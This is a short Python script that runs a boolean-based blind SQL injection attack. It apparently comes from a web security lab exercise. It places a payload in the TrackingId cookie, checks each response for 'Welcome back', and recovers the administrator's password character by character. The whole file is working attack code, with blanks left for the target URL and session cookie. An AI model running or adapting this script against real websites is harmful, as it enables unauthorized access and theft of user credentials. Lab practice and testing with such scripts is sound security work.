import requests
import string

def test_sql_injection(url, session_cookie):
    
    characters = string.ascii_lowercase + string.digits
    password = ''

   
    for position in range(1, 21): 
        flag = False
        print(f"\n--- Testing position {position} ---")

        for char in characters:
           
           # change the payload : your trackingID
            sql_payload = (
                f"bmaJJQR3l9KQ36vn' AND "
                f"(SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
            )

            

            cookies = {
                'TrackingId': sql_payload,
                'session': session_cookie
            }

            try:
         
                response = requests.get(url, cookies=cookies, timeout=5)


                print(f"Testing position {position}, char '{char}': Status {response.status_code}")

           
                if "Welcome back" in response.text:
                    password += char
                    print(f"✔ Found character at position {position}: '{char}'")
                    print(f"Password so far: '{password}'")
                    flag = True
                    break  
            except requests.RequestException as e:
                print(f" Request failed for position {position}, char '{char}': {e}")
                continue  

        if not flag:
            print(f"✖ No matching character found for position {position}. Assuming end of password.")
            break  

    return password

def main():
    
    # fill-in  the url, session cookie

    url = " "
    session_cookie = " "

    print("Starting SQL Injection Password Extraction...")
    extracted_password = test_sql_injection(url, session_cookie)
    print(f"\n Extracted password: '{extracted_password}'")

if __name__ == "__main__":
    main()
